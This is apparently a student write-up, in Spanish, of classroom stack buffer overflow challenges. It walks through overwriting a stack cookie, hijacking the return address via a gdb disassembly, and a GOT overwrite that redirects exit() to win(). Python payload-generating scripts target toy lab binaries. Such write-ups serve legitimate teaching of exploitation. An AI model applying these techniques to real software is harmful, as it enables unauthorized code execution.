# Escalera Pedro, Iman Federico

### Ej 3

#### Challenge 01:
resuelto en clase

#### Challenge 02: 
La unica diferencia es que ahora debemos ingresar el valor que le queremos ingrsar a la cookie directamente en hexa de esta forma: 

    f.write('A'*70 + '\x04' + '\x03' + '\x02' + '\x01')

ya que en ASCII estos valores representan caracteres de control SOH, STX, ETX  y EOT.

Por lo que se hace imposible llegar desde texto a los valores requeridos.

#### Challenge 01 y 02:

La combinacion de los challenges 1 y 2 es facil:

ej1 : 

AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAADCBA

ej2:

AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA

ej 1 y 2:
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAADCBA

#### Challenge 03: 
Este challenge no se puede solucionar de la misma forma que los anteriores. 

El problema aqui es que gets no puede leer todo el contenido ya que luego de llenar el buf con 60 A no encotramos con que debemos mandar un 0x00 lo cual le indica a gets que debe dejar de leer, rompiendo asi nuestra forma de solucion.

Lo que nos queda por hacer en este caso es pisar el registro eip el cual contiene el Program counter, con la direccion del print dentro del if. para hacer esto solo debemos llenar el buf con 60 A lugo la cookie con 4 A, luego el registro ebp con 4 A mas obteniendo asi 68 A y luego ingresa la direccion de memoria deseada para asi poder modificar el registro eip.
La direccion de memoria deseada se puede obtener dentro de gdb con el comando: 

    disas main
obteniendo: 

    0x08048438 <+0>:     push   %ebp

    0x08048439 <+1>:     mov    %esp,%ebp

    0x0804843b <+3>:     sub    $0x40,%esp

    0x0804843e <+6>:     movl   $0x0,-0x4(%ebp)

    0x08048445 <+13>:    lea    -0x40(%ebp),%eax

    0x08048448 <+16>:    push   %eax

    0x08048449 <+17>:    call   0x8048320 
    <gets@plt>
   
    0x0804844e <+22>:    add    $0x4,%esp
   
    0x08048451 <+25>:    cmpl   $0xd0a00,-0x4
    (%ebp)
   
    0x08048458 <+32>:    jne    0x8048467 <main+47>
   
    0x0804845a <+34>:    push   $0x8048544
   
    0x0804845f <+39>:    call   0x8048330 <puts@plt>
   
    0x08048464 <+44>:    add    $0x4,%esp
   
    0x08048467 <+47>:    mov    $0x0,%eax
   
    0x0804846c <+52>:    leave  
   
    0x0804846d <+53>:    ret   

Obteniendo en esta linea la direccion deseada:

    0x0804845a <+34>:    push   $0x8048544

Finalmente pasamos usamos la libreria struct con el metodo pack y la flag "<i" para pasar al 
la direccion de memoria en formato 	
little-endian(<) y como un int (i)

#### Challenge 01 y 03:

Aplicando la misma logica anterior podemos formar la solucion o con el sigueinte script:

    from struct import pack
    f = open('ej3', 'wb')
    f.write('A'*68+pack('<i', 0x0804845a)+'A'*8+'DCBA')
    f.close()

#### Challenge 02 y 03:

Para resolver estos challenge, cambiamos la solucion del 2 y lo solucionamos igual que el 3
es decir, pisamos el eip del challenge 2 para obtener un payload mas grande y asi poder meter la solucion del 3 en el mismo payload sin superposiciones. 


    f = open('ej2y3', 'wb')
    f.write('A'*68+pack('<i', 0x0804845a)+'A'*6+pack('<i', 0x0804845a))

#### Challenge 6

Lo primero que intentamos en este challenge fue causar un buffer overflow y cambiar la return address de la funcion, pero ahi notamos que al final de main no habia un return si no que habia un exit(-1) asi que este metodo no nos iba a funcionar. Sabiendo que podiamos overflowear el buffer 2 nos pusimos a ver que podiamos pisar y nos dimos cuenta que el puntero hacia buf1 se guarda en el stack asi que podiamos poner cualquier direccion de la memoria en ese puntero. Viendo que luego se hace un strcpy y combinado a lo que vimos recien nos dimos cuenta que podiamos escribir cualquier direccion de la memoria poniendo lo que queriamos escribir al principio de buffer2 y poniendo la direccion a donde lo queremos escribir justo al final del payload que le pasamos que cause apenas un buffer overflow (ya que el puntero esta inmediatamente despues en el stack). Sabiendo esto nos pusimos a pensar de que nos podia servir, sabiamos que la parte .text del programa suele estar protegida contra escritura pero viendo el resumen en cutter vimos que el binario tenia RELRO parcial y como encontramos en [este post](https://systemoverlord.com/2017/03/19/got-and-plt-for-pwning.html) la seccion .got.plt se puede escribir. Leyendo .got.plt podemos ver que tiene informacion de donde se encuentra la funcion strcpy y la funcion exit. Esta ultima es la que nos interesa ya que escribiendo en esa direccion la direccion de memoria de la funcion win podiamos forzar al programa a llamar a win() cuando creia que estaba llamando a exit(-1). Luego fue cuestion de analizar bien las direcciones en gdb y armar el payload lo cual hicimos de la siguiente manera:

    f = open('ej6','wb')
    f.write('\xd9\x84\x04\x08' + '\xf9\x84\x04\x08' + 'A' * 376 + '\x14\xa0\x04\x08')

donde 0x0804a014 es la direccion de .got.plt donde se encuentran los datos de exit y 0x080484d9 hasta 080484d9 es mas o menos donde se encuentra win y es lo que se escribe cuando corre strcpy con el puntero pisado anteriormente.

Finalmente las combinaciones fueron bastante faciles ya que el buffer este es bastante grande asi que no se pisa con cosas de los otros ejercicios ni al principio(que los otros ni lo usan) ni al final (ya que tienen distintos tamaños tamaños de buffer ). Utilizamos los siguientes codigos para generar los payloads respectivos:

    Ej 6 y 1
    f = open('ej6y1','wb')
    f.write('\xd9\x84\x04\x08' + '\xf9\x84\x04\x08' + 'A'*72 + 'DCBA' + 'A' * 300 + '\x14\xa0\x04\x08')

    Ej 6 y 2
    f = open('ej6y2','wb')
    f.write('\xd9\x84\x04\x08' + '\xf9\x84\x04\x08' + 'A' * 62 + '\x04\x03\x02\x01' + 'A' * 310 + '\x14\xa0\x04\x08')

    Ej 6 y 3
    f = open('ej6y3','wb')
    f.write('\xd9\x84\x04\x08' + '\xf9\x84\x04\x08' + 'A'*60 + '\x5a\x84\x04\x08' + 'A' * 312 + '\x14\xa0\x04\x08')

    Ej 6_1y2
    f = open('ej6_1y2','wb')
    f.write('\xd9\x84\x04\x08' + '\xf9\x84\x04\x08' + 'A' * 62 + '\x04\x03\x02\x01' +'A'* 6+ 'DCBA' + 'A' * 300 + '\x14\xa0\x04\x08')

    Ej 6_1y3
    f = open('ej6_1y3','wb')
    f.write('\xd9\x84\x04\x08' + '\xf9\x84\x04\x08' + 'A' * 60 + '\x5a\x84\x04\x08' +'A'* 8 + 'DCBA' + 'A' * 300 + '\x14\xa0\x04\x08')

    Ej 6_2y3
    f = open('ej6_2y3','wb')
    f.write('\xd9\x84\x04\x08' + '\xf9\x84\x04\x08' + 'A' * 60 + '\x5a\x84\x04\x08' +'A'* 6 +  '\x5a\x84\x04\x08' + 'A' * 302 + '\x14\xa0\x04\x08')
